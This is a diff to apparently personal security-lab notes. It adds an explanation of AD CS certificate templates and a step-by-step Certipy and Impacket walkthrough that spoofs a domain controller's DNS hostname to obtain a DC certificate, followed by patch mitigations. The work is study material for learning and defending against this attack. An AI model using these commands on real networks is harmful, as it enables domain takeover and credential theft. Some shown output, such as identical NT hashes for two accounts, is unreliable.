@@ -3,7 +3,7 @@
 [💡 09/11/23: Industrial and Commercial Bank of China dealing with LockBit ransomware attack 💡](https://therecord.media/icbc-dealing-with-ransomware-attack)
 
 # Security Expert Labs Documentation
----
+
 ### Contents
 
 1. ✅ [OWASP Top 10 2021](#owasp-top-10-2021)
@@ -839,10 +839,89 @@ AD usually runs on selected domain controllers, where certificate templates (cre
 
 If we have a valid certificate that has the Client Authentication EKU, we can interface with AD CS and the Key Distribution Centre to request a Kerberos TGT that can then be used for further authentication. 
 
-#### Default Domain Certificate Templates
+#### Default Certificate Templates
 
 Default domain certificate templates are either `User Certifcate Templates` or `Machine Certificate Templates`, which are not vulnerable by default.
 
+When requesting a certificate based on the User template, the `User Principal Name (UPN)` will be embedded in the `SAN` and can be used for identification. UPN's are unique and usually not modifiable. Machine accounts do not have UPNs, the Machine template uses the DNS of the machine for identification and authentication. When a certificate is requested through a Machine Template, AD CS embeds the machine's DNS Name into the SAN.
+
+#### Default Domain User Privileges
+All AD account can enrol up to 10 new machines on the domain. When enrolling a new host in AD, the user is the assigned owner, which includes two main permissions:
+
+* Validate write to DNS hostname --> to update DNS hostname of the AD Object associated
+* Validate write to Service Principal Name (SPN) --> Permission allows us to update the SPN of the AD Object
+
+SPN's are used by Kerberos authentication, and they are unique.WHen changing a DNS hostname, Microsoft automatially updates the SPN attribute, but the user still has the ability to change the SPN.
+
+### Practical
+
+Certipy is an offensive tool for enumeration and exploitation of AD CS vulnerabilities and misconfigurations. It integrates with Impacket for some of the exploits.
+
+Commands used:
+
+```
+certipy req 'lunar.eruca.com/thm:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template User
+
+[*] Requesting certificate
+[*] Successfully requested certificate
+[*] Request ID is 20
+[*] Got certificate with UPN 'thm@lunar.eruca.com'
+[*] Saved certificate and private key to 'thm.pfx'
+
+certipy auth -pfx thm.pfx
+
+[*] Using principal: thm@lunar.eruca.com
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'thm.ccache'
+[*] Trying to retrieve NT hash for 'thm'
+[*] Got NT hash for 'thm@lunar.eruca.com': 43460d636f269c709b20049cee36ae7a
+
+addcomputer.py 'lunar.eruca.com/thm:Password1@' -method LDAPS -computer-name 'THMPC' -computer-pass 'Password1@'
+
+[*] Successfully added machine account THMPC$ with password Password1@.
+
+certipy req 'lunar.eruca.com/THMPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template Machine
+
+[*] Requesting certificate
+[*] Successfully requested certificate
+[*] Request ID is 20
+[*] Got certificate with DNS Host Name 'THMPC.lunar.eruca.com'
+[*] Saved certificate and private key to 'thmpc.pfx'
+
+certipy auth -pfx thmpc.pfx
+
+[*] Using principal: thmpc$@lunar.eruca.com
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'thmpc.ccache'
+[*] Trying to retrieve NT hash for 'thmpc$'
+[*] Got NT hash for 'thmpc$@lunar.eruca.com': 43460d636f269c709b20049cee36ae7a
+
+<after ssh>
+
+PS C:\Users\thm>Set-ADComputer THMPC -ServicePrincipalName @{}   #<-- Remove SPN attr.
+
+PS C:\Users\thm>Set-ADComputer THMPC -DnsHostName LUNDC.lunar.eruca.com
+
+<Forging malicious certificate>
+
+certipy req 'lunar.eruca.com/THMPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template Machine
+
+[*] Requesting certificate
+[*] Successfully requested certificate
+[*] Request ID is 21
+[*] Got certificate with DNS Host Name 'LUNDC.lunar.eruca.com'
+[*] Saved certificate and private key to 'lundc.pfx'
+```
+
+### Mitigations
+The best course of action is to apply a patch released by Microsoft. The patch does two things primarily:
+
+* Further identify the user by their objectSid with the `zOID_NTDS_CA_SECURITY_EXT OID`
+* The initial 'Validate write to DNS hostname' permission is modified so it only allows to set DNS hostname to a matching SAM Account Name or Computer account, mitigating spoofing.
+
+Additionally, one could restrict certificates further, or restricting enrolment in AD.
 
 #### [Back to top](#contents)
 
